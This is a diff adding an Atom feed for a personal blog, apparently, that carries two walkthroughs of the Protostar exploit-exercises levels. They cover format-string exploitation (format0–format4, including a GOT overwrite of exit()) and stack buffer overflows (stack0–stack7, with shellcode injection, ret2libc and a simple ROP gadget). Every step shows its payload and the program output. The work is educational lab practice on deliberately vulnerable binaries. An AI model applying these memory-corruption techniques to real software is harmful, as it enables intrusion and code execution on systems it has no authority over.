@@ -1,0 +1,465 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Protostar | tick.Tack]]></title>
+  <link href="http://newdominic.github.io/blog/categories/protostar/atom.xml" rel="self"/>
+  <link href="http://newdominic.github.io/"/>
+  <updated>2016-07-02T01:16:18+08:00</updated>
+  <id>http://newdominic.github.io/</id>
+  <author>
+    <name><![CDATA[DMC]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar: Format]]></title>
+    <link href="http://newdominic.github.io/blog/2016/07/01/Protostar_Format/"/>
+    <updated>2016-07-01T11:32:32+08:00</updated>
+    <id>http://newdominic.github.io/blog/2016/07/01/Protostar_Format</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h2>Reading Material</h2>
+
+<p><a href="https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">Exploiting Format String Vulnerablities</a></p>
+
+<h2><a href="https://exploit-exercises.com/protostar/format0/">Format0</a></h2>
+
+<p>In Format0, our goal is to overflow the <strong>buffer</strong> variable, and change <strong>target</strong> to &ldquo;0xdeadbeef&rdquo;.</p>
+
+<p>The hint says this should be done in less than 10 bytes of input. We can easily fill the <strong>buffer</strong> using 4 bytes: &ldquo;%64d&rdquo;. And the value right after it, will overflow and change <strong>target</strong>&rsquo;s value.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format0 `python -c 'print "%64d\xef\xbe\xad \xde"'`
+you have hit the target correctly :)
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/format1/">Format1</a></h2>
+
+<p>This time, our target is not on the stack anymore. We need it&rsquo;s address to procedure, and it can be done by using &ldquo;objdump -t&rdquo;.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -t ./format1 | grep target
+08049638 g     O .bss   00000004              target
+</code></pre>
+
+<p>The address of <strong>target</strong> is 0x08049638. Next, we will run some test to find out the position of our input located on the stack.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "AAAAAAAA"+"0x%08x."*150'`
+AAAAAAAA0x0804960c.0xbffff3c8.0x08048469.0xb7fd8304.0xb7fd7ff4.0xbffff3c8.0x08048435.0xbffff596.0xb7ff1040.0x0804845b.0xb7fd7ff4.0x08048450.0x00000000.0xbffff448.0xb7eadc76.0x00000002.0xbffff474.0xbffff480.0xb7fe1848.0xbffff430.0xffffffff.0xb7ffeff4.0x0804824d.0x00000001.0xbffff430.0xb7ff0626.0xb7fffab0.0xb7fe1b28.0xb7fd7ff4.0x00000000.0x00000000.0xbffff448.0x00ff9eb6.0x2aa048a6.0x00000000.0x00000000.0x00000000.0x00000002.0x08048340.0x00000000.0xb7ff6210.0xb7eadb9b.0xb7ffeff4.0x00000002.0x08048340.0x00000000.0x08048361.0x0804841c.0x00000002.0xbffff474.0x08048450.0x08048440.0xb7ff1040.0xbffff46c.0xb7fff8f8.0x00000002.0xbffff58c.0xbffff596.0x00000000.0xbffff9b9.0xbffff9c7.0xbffff9d2.0xbffff9f4.0xbffffa07.0xbffffa11.0xbfffff01.0xbfffff3f.0xbfffff53.0xbfffff6a.0xbfffff7b.0xbfffff83.0xbfffff93.0xbfffffa0.0xbfffffd4.0xbfffffe6.0x00000000.0x00000020.0xb7fe2414.0x00000021.0xb7fe2000.0x00000010.0x078bfbbf.0x00000006.0x00001000.0x00000011.0x00000064.0x00000003.0x08048034.0x00000004.0x00000020.0x00000005.0x00000007.0x00000007.0xb7fe3000.0x00000008.0x00000000.0x00000009.0x08048340.0x0000000b.0x000003e9.0x0000000c.0x00000000.0x0000000d.0x000003e9.0x0000000e.0x000003e9.0x00000017.0x00000001.0x00000019.0xbffff56b.0x0000001f.0xbffffff2.0x0000000f.0xbffff57b.0x00000000.0x00000000.0x00000000.0x64000000.0x1fcbe298.0xf6e4ff8c.0x3f504c64.0x69d64c2b.0x00363836.0x00000000.0x00000000.0x00000000.0x6f662f2e.0x74616d72.0x41410031.0x41414141.0x78304141.0x78383025.0x2578302e.0x2e783830.0x30257830.0x302e7838.0x38302578.0x78302e78.0x78383025.0x2578302e.0x2e783830.0x30257830.0x302e7838.0x38302578.0x78302e78.0x78383025.0x2578302e.0x2e783830.0x30257830.0x302e7838.
+</code></pre>
+
+<p>We can find our input has the offset of 610(127*4+2) away from ESP. Let&rsquo;s modify the test code shorter and run again.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "AAAAAAAA"+"%130$x."'`
+AAAAAAAA41414100.
+</code></pre>
+
+<p>Looks like we might need one more byte for a perfect &ldquo;0x41414141&rdquo;. I&rsquo;ll put another &ldquo;A&rdquo; in, and replace the first four &ldquo;A&#8221;s with &#8220;B&#8221;s.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "BBBBAAAAA"+"%130$x."'`
+BBBBAAAAA42424242.
+</code></pre>
+
+<p>Now we have a beautiful &ldquo;0x42424242&rdquo; here. Hence we can modify it to our final address, and replace &ldquo;%130$x&rdquo; with &ldquo;%130$n&rdquo;, so we can write some value into <strong>target</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "AA\x38\x96\x04\x08AA"+"0x%130$08x"'`
+AA8AA0x08049638
+</code></pre>
+
+<p>The final step, we will modify , so we can &ldquo;write&rdquo; some value into <strong>target</strong></p>
+
+<pre><code>.user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print "\x38\x96\x04\x08AAAAA"+"%130$n."'`
+8AAAAA.you have modified the target :)
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/format2/">Format2</a></h2>
+
+<p>We&rsquo;ll retrieve the address of <strong>target</strong> with &ldquo;objdump -t&rdquo; again.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -t ./format2 | grep target
+080496e4 g     O .bss   00000004              target
+</code></pre>
+
+<p>Then we can find out the offset to our input with test code.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "AAAABBBB"+"%08x."*10' | ./format2
+AAAABBBB00000200.b7fd8420.bffff614.41414141.42424242.78383025.3830252e.30252e78.252e7838.2e783830.
+</code></pre>
+
+<p>But, Format2 asks us to modify the value of <strong>target</strong> to &ldquo;64&rdquo;. So we need to print out exact 64 bytes before we use &ldquo;%n&rdquo; to write the value.</p>
+
+<pre><code>python -c 'print "%60d\xe4\x96\x04\x08"+"%5$n"' | ./format2
+                                                     512▒
+you have modified the target :)
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/format3/">Format3</a></h2>
+
+<p>Here&rsquo;s the address of <strong>target</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -t ./format3 | grep target
+080496f4 g     O .bss   00000004              target
+</code></pre>
+
+<p>In Format3, we are challenged to write the value &ldquo;0x01025544&rdquo; into <strong>target</strong>. This needs to be done carefully. We will do it one byte per step.</p>
+
+<p>Let&rsquo;s examine the the location of our input first.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "AAAABBBB"+"%x."*13' | ./format3
+AAAABBBB0.bffff5d0.b7fd7ff4.0.0.bffff7d8.804849d.bffff5d0.200.b7fd8420.bffff614.41414141.42424242.
+</code></pre>
+
+<p>Here we have &ldquo;AAAA&rdquo; at 12, and &ldquo;BBBB&rdquo; at 13. Now we can replace them with the value we want.</p>
+
+<p>The first byte of <strong>target</strong> is &ldquo;0x44&rdquo;, which means we need to print 68 bytes before &ldquo;%n&rdquo;.</p>
+
+<pre><code>python -c 'print "\xf4\x96\x04\x08%64d%12$n"' | ./format3
+                                                           0
+target is 00000044 :(
+</code></pre>
+
+<p>The second byte is &ldquo;0x55&rdquo;, that is 85 in decimal. Since we already print 68 bytes already, we just need to fill the 17 bytes left before next &ldquo;%n&rdquo;. And don&rsquo;t forget to shift the address of <strong>target</strong> for one byte.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08%60d%12$n%17d%13$n"' | ./format3
+                                                           0      -1073744432
+target is 00005544 :(
+</code></pre>
+
+<p>Notice that I inserted the address of second byte &ldquo;0x080496f5&rdquo; right after the first four byte? That would make us calculate the offset easier. But, since we add another 4 bytes before &ldquo;%64d&rdquo;, we need to make it &ldquo;%60d&rdquo; to keep the counting right.</p>
+
+<p>The third byte and the forth byte is &ldquo;0x0102&rdquo;. We can finish them in one step, just by writing the value at &ldquo;0x080496f6&rdquo;.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08%56d%12$n%17d%13$n%173d%14$n"' | ./format3
+                                                       0      -1073744432                                                                                                                                                                  -1208123404
+you have modified the target :)
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/format4/">Format4</a></h2>
+
+<p>Format4 asks us to redirect the code flow to <strong>hello()</strong>. By examining the code, we have <strong>print()</strong> and <strong>exit()</strong> after <strong>fgets()</strong>. But, we need <strong>print()</strong> to tell us if we have succeed or not, so <strong>exit()</strong> is the only option left.</p>
+
+<p>First we check the dynamic relocation address for <strong>exit()</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -TR ./format4
+--snip--
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080496fc R_386_GLOB_DAT    __gmon_start__
+08049730 R_386_COPY        stdin
+0804970c R_386_JUMP_SLOT   __gmon_start__
+08049710 R_386_JUMP_SLOT   fgets
+08049714 R_386_JUMP_SLOT   __libc_start_main
+08049718 R_386_JUMP_SLOT   _exit
+0804971c R_386_JUMP_SLOT   printf
+08049720 R_386_JUMP_SLOT   puts
+08049724 R_386_JUMP_SLOT   exit
+</code></pre>
+
+<p>And we also need the address of <strong>hello()</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -D ./format4 | grep hello
+080484b4 &lt;hello&gt;:
+</code></pre>
+
+<p>So, our mission here is to replace the memory in &ldquo;0x08049724&rdquo; to &ldquo;0x080484b4&rdquo;. The last thing to find is the actual location of our input.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "AAAABBBB"+"%08x."*10' | ./format4
+AAAABBBB00000200.b7fd8420.bffff614.41414141.42424242.78383025.3830252e.30252e78.252e7838.2e783830.
+</code></pre>
+
+<p>We got &ldquo;AAAA&rdquo; at 4. Now we can build our final payload just like we did in Format3.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x27\x97\x04\x08%168d%4$n%976d%5$n%132d%6$n"' | ./format4
+$%'                                                                                                                                                                     512                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     -1208122336                                                                                                                         -1073744364
+code execution redirected! you win
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar: Stack]]></title>
+    <link href="http://newdominic.github.io/blog/2016/06/30/Protostar_Stack/"/>
+    <updated>2016-06-30T13:06:22+08:00</updated>
+    <id>http://newdominic.github.io/blog/2016/06/30/Protostar_Stack</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h2><a href="https://exploit-exercises.com/protostar/stack0/">Stack0</a></h2>
+
+<p>Since Stack0 only needs to change the <strong>modified</strong> variable to be a non-zero value. All you need to do is, to overflow the <strong>buffer</strong> variable with more than 64 characters.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 + "AAAA"' | ./stack0
+you have changed the 'modified' variable
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack1/">Stack1</a></h2>
+
+<p>Stack1 asks us to change the <strong>modified</strong> variable to a specific hexadecimal number: 0x61626364, which can be translated to ASCII as &ldquo;abcd&rdquo;. The hint says that &ldquo;Protostar is <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a>&rdquo;. So we&rsquo;ll need to have the string text in reverse order.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "A"*64+"dcba"'`
+you have correctly got the variable to the right value
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack2/">Stack2</a></h2>
+
+<p>Not like Stack0 and Stack1. Stack2 reads the environment variable from the system, then use it to change the <strong>modified</strong> variable. This time we will set the GREENIE environment variable, and let the program work itself.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
+user@protostar:/opt/protostar/bin$ ./stack2
+you have correctly modified the variable
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack3/">Stack3</a></h2>
+
+<p>This time, we&rsquo;re going to modify a function pointer. If we overflow the <strong>fp</strong> with a wrong <strong>address</strong>, the program might crash immediately.</p>
+
+<p>Calling the <strong>win()</strong> function is our goal. We need the <strong>fp</strong> to be overwritten with the address of <strong>win()</strong>. So our first step is to find out the address.</p>
+
+<p>There are two ways to achieve this goal. We can use <strong>objdump</strong> or <strong>gdb</strong> to read out the address.</p>
+
+<p>Using objdump:</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -D stack3 | grep -A7 win
+08048424 &lt;win&gt;:
+ 8048424:       55                      push   %ebp
+ 8048425:       89 e5                   mov    %esp,%ebp
+ 8048427:       83 ec 18                sub    $0x18,%esp
+ 804842a:       c7 04 24 40 85 04 08    movl   $0x8048540,(%esp)
+ 8048431:       e8 2a ff ff ff          call   8048360 &lt;puts@plt&gt;
+ 8048436:       c9                      leave
+ 8048437:       c3                      ret
+</code></pre>
+
+<p>Using gdb:</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack3
+Reading symbols from /opt/protostar/bin/stack3...done.
+(gdb) p win
+$1 = {void (void)} 0x8048424 &lt;win&gt;
+</code></pre>
+
+<p>With both methods, we know the address of <strong>win()</strong> is 0x8048424. Now we can build our string to exploit Stack3.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"\x24\x84\x04\x08"' | ./stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack4/">Stack4</a></h2>
+
+<p>Stack4 is similar to Stack3. But this time our target has changed to0 the saved <strong>EIP</strong>.</p>
+
+<p>First we still need to find out the address of <strong>win()</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack4
+Reading symbols from /opt/protostar/bin/stack4...done.
+(gdb) p win
+$1 = {void (void)} 0x80483f4 &lt;win&gt;
+</code></pre>
+
+<p>We need to use <strong>gdb</strong> to find out the offset from <strong>buffer</strong> variable to <strong>EIP</strong>. Since the program will crash while accessing an illegal address, we can build a non-repeating string to locate the offset of <strong>EIP</strong>.</p>
+
+<pre><code>python -c 'print "A"*64+"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"' &gt; /tmp/stack4
+</code></pre>
+
+<p>After we built the string, now we can run stack4 in gdb to check the result.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack4
+Reading symbols from /opt/protostar/bin/stack4...done.
+(gdb) run &lt; /tmp/stack4
+Starting program: /opt/protostar/bin/stack4 &lt; /tmp/stack4
+
+Program received signal SIGSEGV, Segmentation fault.
+0x48474644 in ?? ()
+(gdb) p $eip
+$1 = (void (*)()) 0x48474644
+</code></pre>
+
+<p>Here we can see that stack4 crashed when the EIP pointed to 0x48474644, which is the reverse order of the string &ldquo;DFGH&rdquo;. Now we know the offset from the end of <strong>buffer</strong> variable to <strong>EIP</strong> is 12. It&rsquo;s time to build the final string and run against stack4.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"B"*12+"\xf4\x83\x04\x08"' | ./stack4
+code flow successfully changed
+Segmentation fault
+</code></pre>
+
+<p>We have successfully called the <strong>win()</strong> function, but the program still crashed. That is because, although we direct the flow to <strong>win()</strong>, it still needs an appropriate return address while exiting from <strong>win()</strong>. We will discuss this issue later.</p>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack5/">Stack5</a></h2>
+
+<p>In Stack5, we don&rsquo;t have any targets to direct to. This is where the shellcode comes in. As the hint says, it might be easier to use someone elses shellcode. I&rsquo;ll use a shellcode I found <a href="http://stackoverflow.com/questions/15593214/linux-shellcode-hello-world">here</a>, which prints &ldquo;Hello World!&rdquo; to screen.</p>
+
+<p>Let&rsquo;s begin with finding the offset to EIP. We&rsquo;ll use the same non-repeating string from Stack4 for it.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) run &lt; /tmp/stack4
+Starting program: /opt/protostar/bin/stack5 &lt; /tmp/stack4
+
+Program received signal SIGSEGV, Segmentation fault.
+0x48474644 in ?? ()
+</code></pre>
+
+<p>The result is the same as Stack4, the offset to EIP is still 12. But, what value should we put in EIP?</p>
+
+<p>This time, we will put our shellcode in the <strong>buffer</strong> variable, and direct the EIP to point to the address of it. Once the EIP hit the address of <strong>buffer</strong>, it will run our shellcode as we expected.</p>
+
+<p>We can find the address of <strong>buffer</strong> by setting a breakpoint in main. Let&rsquo;s set the breakpoint right before the <strong>gets()</strong> get called.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483c4 &lt;main+0&gt;:    push   %ebp
+0x080483c5 &lt;main+1&gt;:    mov    %esp,%ebp
+0x080483c7 &lt;main+3&gt;:    and    $0xfffffff0,%esp
+0x080483ca &lt;main+6&gt;:    sub    $0x50,%esp
+0x080483cd &lt;main+9&gt;:    lea    0x10(%esp),%eax
+0x080483d1 &lt;main+13&gt;:   mov    %eax,(%esp)
+0x080483d4 &lt;main+16&gt;:   call   0x80482e8 &lt;gets@plt&gt;
+0x080483d9 &lt;main+21&gt;:   leave
+0x080483da &lt;main+22&gt;:   ret
+End of assembler dump.
+(gdb) b *0x080483d4
+Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.
+(gdb) r
+Starting program: /opt/protostar/bin/stack5
+
+Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff824) at stack5/stack5.c:10
+10      stack5/stack5.c: No such file or directory.
+        in stack5/stack5.c
+(gdb) p &amp;buffer
+$1 = (char (*)[64]) 0xbffff788
+</code></pre>
+
+<p>Now we have the address of <strong>buffer</strong>: 0xbffff788. We can build the final string and run against Stack5.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHello world!"+"\x00"*12+"B"*12+"\x88\xf7\xff\xbf"' | ./stack5
+Hello world!
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack6/">Stack6</a></h2>
+
+<p>This time, we have a restriction on the return address. The first byte of return address cannot be <strong>0xbf</strong>.</p>
+
+<p>Let&rsquo;s get the address of <strong>buffer</strong> and the EIP first.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack6
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) run &lt; /tmp/stack4
+Starting program: /opt/protostar/bin/stack6 &lt; /tmp/stack4
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJKLZTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm
+
+Program received signal SIGSEGV, Segmentation fault.
+0x5a4c4b4a in ?? ()
+</code></pre>
+
+<p>&ldquo;0x5a4c4b4a&rdquo; is &ldquo;JKLZ&rdquo; in reverse order. The offset here is 16.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack6
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) disas getpath
+Dump of assembler code for function getpath:
+0x08048484 &lt;getpath+0&gt;: push   %ebp
+0x08048485 &lt;getpath+1&gt;: mov    %esp,%ebp
+0x08048487 &lt;getpath+3&gt;: sub    $0x68,%esp
+0x0804848a &lt;getpath+6&gt;: mov    $0x80485d0,%eax
+0x0804848f &lt;getpath+11&gt;:        mov    %eax,(%esp)
+0x08048492 &lt;getpath+14&gt;:        call   0x80483c0 &lt;printf@plt&gt;
+0x08048497 &lt;getpath+19&gt;:        mov    0x8049720,%eax
+0x0804849c &lt;getpath+24&gt;:        mov    %eax,(%esp)
+0x0804849f &lt;getpath+27&gt;:        call   0x80483b0 &lt;fflush@plt&gt;
+0x080484a4 &lt;getpath+32&gt;:        lea    -0x4c(%ebp),%eax
+0x080484a7 &lt;getpath+35&gt;:        mov    %eax,(%esp)
+0x080484aa &lt;getpath+38&gt;:        call   0x8048380 &lt;gets@plt&gt;
+---snip---
+(gdb) b *0x080484aa
+Breakpoint 1 at 0x80484aa: file stack6/stack6.c, line 13.
+(gdb) run
+Starting program: /opt/protostar/bin/stack6
+input path please:
+Breakpoint 1, 0x080484aa in getpath () at stack6/stack6.c:13
+13      stack6/stack6.c: No such file or directory.
+        in stack6/stack6.c
+(gdb) p &amp;buffer
+$1 = (char (*)[64]) 0xbffff6fc
+</code></pre>
+
+<p>The address of <strong>buffer</strong> is &ldquo;0xbffff6fc&rdquo;. Now let&rsquo;s build the string to run the &ldquo;Hello World!&rdquo; shellcode.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHello world!"+"\x00"*12+"B"*16+"\xfc\xf6\xff\xbf"' | ./stack6
+input path please: bzzzt (0xbffff71c)
+</code></pre>
+
+<p>Oops! We are caught using return address starts with <strong>0xbf</strong>.</p>
+
+<p>Stack6 can be done in a couple ways:</p>
+
+<ol>
+<li>finding the duplicate of payload.</li>
+<li>ret2libc (Return to LibC)</li>
+<li>ROP (Return Oriented Programming)</li>
+</ol>
+
+
+<p>I&rsquo;ll use &ldquo;Return to LibC&rdquo; to exploit in this case.</p>
+
+<p><strong>Ret2LibC</strong></p>
+
+<p>I&rsquo;ll make the program to print out &ldquo;Hello World!&rdquo; with the <strong>write()</strong> function. First of all, we need to know the address of <strong>write()</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb stack6 -q
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) b main
+Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
+(gdb) run
+Starting program: /opt/protostar/bin/stack6
+
+Breakpoint 1, main (argc=1, argv=0xbffff804) at stack6/stack6.c:27
+27      stack6/stack6.c: No such file or directory.
+        in stack6/stack6.c
+(gdb) p write
+$1 = {&lt;text variable, no debug info&gt;} 0xb7f53c70 &lt;write&gt;
+</code></pre>
+
+<p>By returing to <strong>write()</strong>, we&rsquo;ll need to make the call stack looks like a real function call.</p>
+
+<pre><code>write(1, "Hello World!");
+</code></pre>
+
+<p>The first parameter &ldquo;1&rdquo; stands for STDOUT, so the string will be directly printed out on the screen. And the second parameter will be the address pointed to the string we want. Now let&rsquo;s build the final payload.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "Hello World!\n"+"\x00"*67+"\x70\x3c\xf5\xb7"+"\xfc\xf6\xff\xbf"+"\x01\x00\x00\x00"' | ./stack6
+input path please: got path Hello World!
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack7/">Stack7</a></h2>
+
+<p>The restriction on Stack7 became a nightmare, we can&rsquo;t even return to address starts with <strong>0xb</strong>. This time, we will solve Stack7 with ROP attack.</p>
+
+<p>Just like we have done many times, it&rsquo;s easy to dig out the address of <strong>buffer</strong>: &ldquo;0xbffff78c&rdquo;. The most important thing is, we need some &ldquo;gadget&rdquo; to return to our shellcode. And we can do it just by reading the output of <strong>objdump</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -D stack7 |grep -A 7 main
+--snip--
+08048545 &lt;main&gt;:
+ 8048545:       55                      push   %ebp
+ 8048546:       89 e5                   mov    %esp,%ebp
+ 8048548:       83 e4 f0                and    $0xfffffff0,%esp
+ 804854b:       e8 74 ff ff ff          call   80484c4 &lt;getpath&gt;
+ 8048550:       89 ec                   mov    %ebp,%esp
+ 8048552:       5d                      pop    %ebp
+ 8048553:       c3                      ret
+</code></pre>
+
+<p>Usually, ROP attack is composed with bunch of &ldquo;gadgets&rdquo; - machine instruction sequences ends with <strong>return</strong> instruction. But, since Stack7 is not that complicated, the return instruction here just suits our needs.</p>
+
+<p>We can re-use the payload from Stack5, just need to insert the address of the <strong>return</strong> instruction right before the address of <strong>buffer</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHello world!"+"\x00"*12+"B"*16+"\x53\x85\x04\x08"+"\x8c\xf7\xff\xbf"' |  ./stack7 -s
+input path please: got path ▒
+Hello world!
+</code></pre>
+]]></content>
+  </entry>
+  
+</feed>
